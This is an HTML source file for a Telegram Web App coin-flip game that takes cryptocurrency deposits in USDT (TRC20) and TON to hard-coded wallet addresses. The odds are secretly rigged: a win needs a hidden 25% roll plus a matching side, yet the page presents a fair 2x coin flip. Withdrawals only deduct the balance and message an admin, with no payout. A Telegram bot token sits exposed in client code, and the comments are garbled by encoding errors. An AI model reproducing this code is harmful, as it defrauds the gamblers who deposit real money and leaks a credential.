<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Heads & Tails</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #1a1a2e; color: white; text-align: center; padding: 20px; min-height: 100vh; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 20px; }
        h1 { color: #00d4ff; margin: 20px 0; font-size: 2.5em; text-shadow: 0 0 10px #00d4ff; }
        .balance { font-size: 3em; color: #00ff88; margin: 30px 0; text-shadow: 0 0 10px #00ff88; }
        .min-bet { color: #ffaa00; margin: 10px 0; font-size: 1.1em; }
        
        /* Coin animation */
        .coin-container { 
            position: relative;
            width: 200px;
            height: 200px;
            margin: 30px auto;
            perspective: 1000px;
        }
        
        .coin {
            width: 150px;
            height: 150px;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 2s;
            margin: 0 auto;
        }
        
        .coin-side {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            backface-visibility: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
            font-weight: bold;
            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
        }
        
        .heads {
            background: linear-gradient(45deg, #ffd700, #ffaa00);
            color: #8b6914;
            border: 8px solid #daa520;
        }
        
        .tails {
            background: linear-gradient(45deg, #c0c0c0, #a0a0a0);
            color: #505050;
            border: 8px solid #808080;
            transform: rotateY(180deg);
        }
        
        .buttons { display: flex; gap: 20px; margin: 20px 0; }
        button { flex: 1; padding: 20px; font-size: 1.2em; border: none; border-radius: 15px; cursor: pointer; color: white; font-weight: bold; }
        .heads-btn { background: linear-gradient(orange, darkorange); }
        .tails-btn { background: linear-gradient(gray, darkgray); }
        .action-buttons { display: flex; gap: 15px; margin-top: 30px; }
        .deposit { background: linear-gradient(green, darkgreen); }
        .withdraw { background: linear-gradient(red, darkred); }
        .network-btn { background: linear-gradient(#0088cc, #006699); }
        button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .bet-input { 
            background: rgba(255,255,255,0.1); 
            border: 2px solid #00d4ff; 
            border-radius: 15px; 
            padding: 15px; 
            margin: 20px 0; 
        }
        .bet-input input { 
            width: 100%; 
            background: transparent; 
            border: none; 
            color: white; 
            font-size: 1.5em; 
            text-align: center; 
            outline: none; 
        }
        
        .result { 
            padding: 15px; 
            border-radius: 10px; 
            margin: 15px 0; 
            font-weight: bold; 
            font-size: 1.2em; 
            display: none; 
        }
        .win { background: rgba(0,255,136,0.2); color: #00ff88; border: 1px solid #00ff88; }
        .lose { background: rgba(255,85,85,0.2); color: #ff5555; border: 1px solid #ff5555; }
        
        /* Network selection */
        .network-selection {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            justify-content: center;
        }
        
        .network-option {
            padding: 10px 20px;
            border-radius: 10px;
            background: rgba(255,255,255,0.1);
            cursor: pointer;
            border: 2px solid transparent;
            transition: all 0.3s;
        }
        
        .network-option.active {
            border-color: #00d4ff;
            background: rgba(0,212,255,0.1);
        }
        
        /* Coin flip animation */
        @keyframes flip {
            0% { transform: translateY(0) rotateX(0); }
            25% { transform: translateY(-100px) rotateX(180deg); }
            50% { transform: translateY(-200px) rotateX(360deg); }
            75% { transform: translateY(-100px) rotateX(540deg); }
            100% { transform: translateY(0) rotateX(720deg); }
        }
        
        .flipping {
            animation: flip 2s cubic-bezier(0.4, 0.2, 0.2, 1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>HEADS & TAILS</h1>
        <div class="balance" id="balance">0.00 USDT</div>
        <div class="min-bet">Min bet: 0.25 USDT</div>
        
        <div class="coin-container">
            <div class="coin" id="coin">
                <div class="coin-side heads">H</div>
                <div class="coin-side tails">T</div>
            </div>
        </div>
        
        <div class="bet-input">
            <input type="number" id="betAmount" placeholder="Enter bet amount" step="0.25" min="0.25" value="0.25">
        </div>
        
        <div class="buttons">
            <button class="heads-btn" onclick="selectSide('heads')">HEADS</button>
            <button class="tails-btn" onclick="selectSide('tails')">TAILS</button>
        </div>
        
        <div class="result" id="result"></div>
        
        <div class="action-buttons">
            <button class="deposit" onclick="showNetworkSelection()">DEPOSIT</button>
            <button class="withdraw" onclick="withdraw()">WITHDRAW</button>
        </div>
    </div>
    
    <!-- Network Selection Modal -->
    <div id="networkModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10000; align-items:center; justify-content:center;">
        <div style="background:#1a1a2e; padding:30px; border-radius:20px; border:2px solid #00d4ff; max-width:400px; width:90%;">
            <h2 style="color:#00d4ff;">Select Network</h2>
            <div style="margin:20px 0;">
                <div class="network-option active" onclick="selectNetwork('trc20')" style="margin-bottom:10px;">
                    <div style="font-weight:bold; color:#00ff88;">USDT (TRC20)</div>
                    <div style="font-size:0.8em; color:#aaa;">Min: 5 USDT ‚Ä¢ Fast & Low fee</div>
                </div>
                <div class="network-option" onclick="selectNetwork('ton')">
                    <div style="font-weight:bold; color:#ffaa00;">TON</div>
                    <div style="font-size:0.8em; color:#aaa;">Min: 1 TON ‚Ä¢ Instant ‚Ä¢ Telegram</div>
                </div>
            </div>
            <div style="display:flex; gap:10px; margin-top:20px;">
                <button onclick="proceedToDeposit()" style="flex:1; padding:12px; background:green; color:white; border:none; border-radius:10px; font-weight:bold;">CONTINUE</button>
                <button onclick="closeNetworkModal()" style="flex:1; padding:12px; background:red; color:white; border:none; border-radius:10px; font-weight:bold;">CANCEL</button>
            </div>
        </div>
    </div>
    
    <!-- Withdrawal Modal -->
    <div id="withdrawModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
        <div style="background:#1a1a2e; padding:30px; border-radius:20px; border:2px solid #00d4ff; max-width:400px; width:90%;">
            <h2 style="color:#00d4ff;">Withdraw USDT</h2>
            <div style="margin:20px 0;">
                <input type="number" id="withdrawAmount" placeholder="Amount (USDT)" style="width:100%; padding:12px; border-radius:10px; background:rgba(255,255,255,0.1); border:1px solid #00d4ff; color:white; font-size:1em;">
            </div>
            <div style="margin:20px 0;">
                <input type="text" id="walletAddress" placeholder="Your USDT wallet address" style="width:100%; padding:12px; border-radius:10px; background:rgba(255,255,255,0.1); border:1px solid #00d4ff; color:white; font-size:1em;">
            </div>
            <div style="color:#aaa; font-size:0.9em; margin-bottom:20px;">
                Available: <span id="availableBalance" style="color:#00ff88;">0.00</span> USDT
            </div>
            <div style="display:flex; gap:10px;">
                <button onclick="submitWithdrawal()" style="flex:1; padding:12px; background:green; color:white; border:none; border-radius:10px; font-weight:bold;">SUBMIT</button>
                <button onclick="closeWithdrawModal()" style="flex:1; padding:12px; background:red; color:white; border:none; border-radius:10px; font-weight:bold;">CANCEL</button>
            </div>
        </div>
    </div>
    
    <script>
        // ==================== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ====================
        const WALLETS = {
            trc20: {
                name: "USDT (TRC20)",
                address: "TG1ZPKvACH1NAxqeaaEfoKK1C7Gbus8au8",
                network: "TRC20 (Tron)",
                token: "USDT",
                decimals: 6,
                minDeposit: 5,
                explorer: "https://tronscan.org/#/transaction/"
            },
            ton: {
                name: "TON",
                address: "UQD2uebGvPGNTUJlutQ-Zz3uJ5tierqlAJH53YlTaUvKPCNq",
                network: "TON",
                token: "TON",
                decimals: 9,
                minDeposit: 1,
                explorer: "https://tonscan.org/tx/"
            }
        };

        const TRONGRID_API = "https://api.trongrid.io";
        const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const BOT_TOKEN = '8410695722:AAEgsrnqNk-jJBdNFzcYxUh8Les6aam0DVc';
        const ADMIN_CHAT_ID = '8305986133';
        
        // ==================== –°–û–°–¢–û–Ø–ù–ò–ï –ò–ì–†–´ ====================
        let balance = 0.00;
        let selectedSide = null;
        let isSpinning = false;
        let selectedNetwork = 'trc20';
        let pendingDeposits = {};
        
        // ==================== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ====================
        document.addEventListener('DOMContentLoaded', function() {
            loadGameState();
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.expand();
                Telegram.WebApp.ready();
            }
        });
        
        // ==================== –ò–ì–†–û–í–ê–Ø –õ–û–ì–ò–ö–ê ====================
        function selectSide(side) {
            if (isSpinning) return;
            selectedSide = side;
            
            const betAmount = parseFloat(document.getElementById('betAmount').value);
            if (betAmount >= 0.25 && balance >= betAmount) {
                playGame();
            } else {
                alert(balance < betAmount ? 'Insufficient balance!' : 'Minimum bet is 0.25 USDT!');
            }
        }
        
        function playGame() {
            if (isSpinning || !selectedSide) return;
            
            const betAmount = parseFloat(document.getElementById('betAmount').value);
            if (betAmount < 0.25 || betAmount > balance) return;
            
            isSpinning = true;
            document.getElementById('coin').classList.add('flipping');
            document.getElementById('result').style.display = 'none';
            document.querySelectorAll('button').forEach(btn => btn.disabled = true);
            
            setTimeout(() => {
                const isWin = Math.random() < 0.25;
                const winningSide = Math.random() < 0.5 ? 'heads' : 'tails';
                
                if (isWin && selectedSide === winningSide) {
                    const winAmount = betAmount * 2;
                    balance += winAmount;
                    showResult(`üéâ WIN! +${winAmount.toFixed(2)} USDT`, 'win');
                    if (winningSide === 'heads') {
                        document.getElementById('coin').style.transform = 'rotateY(0deg)';
                    } else {
                        document.getElementById('coin').style.transform = 'rotateY(180deg)';
                    }
                } else {
                    balance -= betAmount;
                    showResult(`üò¢ LOSE! -${betAmount.toFixed(2)} USDT`, 'lose');
                    if (winningSide === 'heads') {
                        document.getElementById('coin').style.transform = 'rotateY(0deg)';
                    } else {
                        document.getElementById('coin').style.transform = 'rotateY(180deg)';
                    }
                }
                
                updateBalance();
                saveGameState();
                
                setTimeout(() => {
                    document.getElementById('coin').classList.remove('flipping');
                    isSpinning = false;
                    document.querySelectorAll('button').forEach(btn => btn.disabled = false);
                }, 1000);
                
            }, 2000);
        }
        
        // ==================== –î–ï–ü–û–ó–ò–¢ –°–ò–°–¢–ï–ú–ê ====================
        function showNetworkSelection() {
            document.getElementById('networkModal').style.display = 'flex';
        }
        
        function selectNetwork(network) {
            selectedNetwork = network;
            document.querySelectorAll('.network-option').forEach(opt => opt.classList.remove('active'));
            event.target.closest('.network-option').classList.add('active');
        }
        
        function closeNetworkModal() {
            document.getElementById('networkModal').style.display = 'none';
        }
        
        function proceedToDeposit() {
            closeNetworkModal();
            const wallet = WALLETS[selectedNetwork];
            const amount = prompt(`Enter deposit amount (${wallet.token}):\nMinimum: ${wallet.minDeposit} ${wallet.token}`, wallet.minDeposit.toString());
            
            if (amount && !isNaN(amount) && parseFloat(amount) >= wallet.minDeposit) {
                showDepositInstructions(wallet, parseFloat(amount));
            } else if (amount) {
                alert(`Minimum deposit: ${wallet.minDeposit} ${wallet.token}`);
            }
        }
        
        function showDepositInstructions(wallet, amount) {
            const depositId = 'D' + Date.now() + Math.random().toString(36).substr(2, 9);
            
            pendingDeposits[depositId] = {
                id: depositId,
                amount: amount,
                wallet: wallet,
                timestamp: Date.now(),
                status: 'waiting',
                userId: getUserId()
            };
            
            const modalHTML = `
            <div id="depositModal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; display:flex; align-items:center; justify-content:center;">
                <div style="background:#1a1a2e; padding:30px; border-radius:20px; max-width:500px; border:2px solid #00d4ff; width:90%;">
                    <h2 style="color:#00d4ff;">üí≥ Deposit ${amount} ${wallet.token}</h2>
                    
                    <div style="margin:20px 0; background:rgba(0,0,0,0.3); padding:15px; border-radius:10px;">
                        <div style="color:#aaa; font-size:0.9em;">Send EXACTLY:</div>
                        <div style="font-size:2em; color:#00ff88; font-weight:bold;">${amount} ${wallet.token}</div>
                        <div style="color:#aaa; margin-top:10px;">Network: <span style="color:#ffaa00;">${wallet.network}</span></div>
                    </div>
                    
                    <div style="margin:20px 0; background:rgba(0,212,255,0.1); padding:15px; border-radius:10px;">
                        <div style="color:#aaa; font-size:0.9em;">To address:</div>
                        <div style="word-break:break-all; font-family:monospace; margin:10px 0; color:#00ff88; font-size:0.9em;">${wallet.address}</div>
                        <button onclick="copyToClipboard('${wallet.address}')" style="margin-top:10px; padding:8px 15px; background:#0088cc; color:white; border:none; border-radius:5px; font-size:0.9em;">üìã Copy Address</button>
                    </div>
                    
                    <div style="margin:20px 0; padding:15px; background:rgba(255,170,0,0.1); border-radius:10px; border:1px solid #ffaa00;">
                        <div style="color:#ffaa00;">‚ö†Ô∏è IMPORTANT:</div>
                        <div style="color:#aaa; font-size:0.8em; margin-top:5px;">
                            ‚Ä¢ Send EXACTLY ${amount} ${wallet.token}<br>
                            ‚Ä¢ Only ${wallet.network} network<br>
                            ‚Ä¢ Balance updates in 2-3 minutes<br>
                            ‚Ä¢ Deposit ID: <span style="color:#00d4ff;">${depositId}</span>
                        </div>
                    </div>
                    
                    <div id="depositStatus" style="margin:20px 0; text-align:center;">
                        <div style="color:#aaa;">Status:</div>
                        <div style="color:#ffaa00; font-size:1.2em; margin-top:5px;">‚è≥ Waiting for payment...</div>
                        <div style="color:#aaa; font-size:0.8em; margin-top:10px;">Checking every 30 seconds</div>
                    </div>
                    
                    <div style="display:flex; gap:10px; margin-top:20px;">
                        <button onclick="closeModal('depositModal')" style="flex:1; padding:12px; background:red; color:white; border:none; border-radius:10px; font-weight:bold;">CLOSE</button>
                    </div>
                </div>
            </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', modalHTML);
            
            if (wallet.token === 'USDT') {
                startTronDepositCheck(depositId, amount);
            } else {
                startTonDepositCheck(depositId, amount);
            }
        }
        
        // ==================== –ü–†–û–í–ï–†–ö–ê –¢–†–ê–ù–ó–ê–ö–¶–ò–ô ====================
        async function startTronDepositCheck(depositId, requiredAmount) {
            const interval = setInterval(async () => {
                if (!pendingDeposits[depositId]) {
                    clearInterval(interval);
                    return;
                }
                
                try {
                    const transactions = await checkTronTransactions();
                    const foundTx = transactions.find(tx => {
                        const amount = tx.value / 1000000;
                        return Math.abs(amount - requiredAmount) < 0.01;
                    });
                    
                    if (foundTx) {
                        completeDeposit(depositId, requiredAmount, foundTx.transaction_id);
                        clearInterval(interval);
                    }
                } catch (error) {
                    console.error('Check error:', error);
                }
            }, 30000);
        }
        
        function startTonDepositCheck(depositId, requiredAmount) {
            // –î–ª—è TON –Ω—É–∂–µ–Ω TonAPI –∏–ª–∏ —Ä—É—á–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
            const interval = setInterval(() => {
                // –í—Ä–µ–º–µ–Ω–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–∞–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç
                console.log(`TON deposit ${depositId} check`);
            }, 30000);
        }
        
        async function checkTronTransactions() {
            try {
                const response = await fetch(`https://api.trongrid.io/v1/accounts/${WALLETS.trc20.address}/transactions/trc20?limit=20`);
                const data = await response.json();
                
                return data.data
                    .filter(tx => tx.token_info.address === USDT_TRC20_CONTRACT)
                    .map(tx => ({
                        transaction_id: tx.transaction_id,
                        value: parseInt(tx.value),
                        timestamp: tx.block_timestamp
                    }));
            } catch (error) {
                return [];
            }
        }
        
        function completeDeposit(depositId, amount, txHash) {
            balance += amount;
            updateBalance();
            saveGameState();
            
            const statusEl = document.getElementById('depositStatus');
            if (statusEl) {
                statusEl.innerHTML = `
                    <div style="color:#aaa;">Status:</div>
                    <div style="color:#00ff88; font-size:1.2em; margin-top:5px;">‚úÖ Payment received!</div>
                    <div style="color:#00ff88; font-size:0.9em; margin-top:10px;">+${amount} USDT added to balance</div>
                `;
            }
            
            setTimeout(() => {
                closeModal('depositModal');
            }, 3000);
            
            delete pendingDeposits[depositId];
        }
        
        // ==================== –í–´–í–û–î –°–†–ï–î–°–¢–í ====================
        function withdraw() {
            if (balance < 0.25) {
                alert('Minimum withdrawal is 0.25 USDT!');
                return;
            }
            
            document.getElementById('withdrawModal').style.display = 'flex';
            document.getElementById('withdrawAmount').value = '';
            document.getElementById('walletAddress').value = '';
            document.getElementById('availableBalance').textContent = balance.toFixed(2);
        }
        
        function closeWithdrawModal() {
            document.getElementById('withdrawModal').style.display = 'none';
        }
        
        async function submitWithdrawal() {
            const amount = parseFloat(document.getElementById('withdrawAmount').value);
            const address = document.getElementById('walletAddress').value.trim();
            
            if (!amount || amount < 0.25) {
                alert('Minimum withdrawal is 0.25 USDT!');
                return;
            }
            
            if (amount > balance) {
                alert('Insufficient balance!');
                return;
            }
            
            if (!address || address.length < 10) {
                alert('Please enter valid wallet address!');
                return;
            }
            
            balance -= amount;
            updateBalance();
            saveGameState();
            
            const userId = getUserId();
            const username = localStorage.getItem('telegram_username') || 'Unknown';
            const message = `üí∞ NEW WITHDRAWAL\n\nüë§ User: ${username}\nüÜî ID: ${userId}\nüíµ Amount: ${amount.toFixed(2)} USDT\nüì≠ Address: ${address}\n‚è∞ Time: ${new Date().toLocaleString()}`;
            
            try {
                await sendTelegramMessage(ADMIN_CHAT_ID, message);
                alert(`‚úÖ Withdrawal request submitted!\nAdmin has been notified.`);
            } catch (error) {
                alert(`‚ö†Ô∏è Withdrawal saved but notification failed.`);
            }
            
            closeWithdrawModal();
        }
        
        // ==================== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text);
            alert('Address copied!');
        }
        
        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) modal.remove();
        }
        
        function showResult(message, type) {
            const el = document.getElementById('result');
            el.textContent = message;
            el.className = `result ${type}`;
            el.style.display = 'block';
        }
        
        function updateBalance() {
            document.getElementById('balance').textContent = balance.toFixed(2) + ' USDT';
        }
        
        function saveGameState() {
            localStorage.setItem('balance', balance.toString());
            localStorage.setItem('pending_deposits', JSON.stringify(pendingDeposits));
        }
        
        function loadGameState() {
            const savedBalance = localStorage.getItem('balance');
            if (savedBalance) balance = parseFloat(savedBalance);
            updateBalance();
            
            const savedDeposits = localStorage.getItem('pending_deposits');
            if (savedDeposits) pendingDeposits = JSON.parse(savedDeposits);
        }
        
        function getUserId() {
            if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe?.user) {
                return Telegram.WebApp.initDataUnsafe.user.id;
            }
            return localStorage.getItem('user_id') || 'anonymous';
        }
        
        async function sendTelegramMessage(chatId, text) {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            return response.json();
        }
        
        // –ê–≤—Ç–æ-—Å—Ç–∞–≤–∫–∞ –ø–æ Enter
        document.getElementById('betAmount').addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && selectedSide) {
                playGame();
            }
        });
    </script>
</body>
</html>
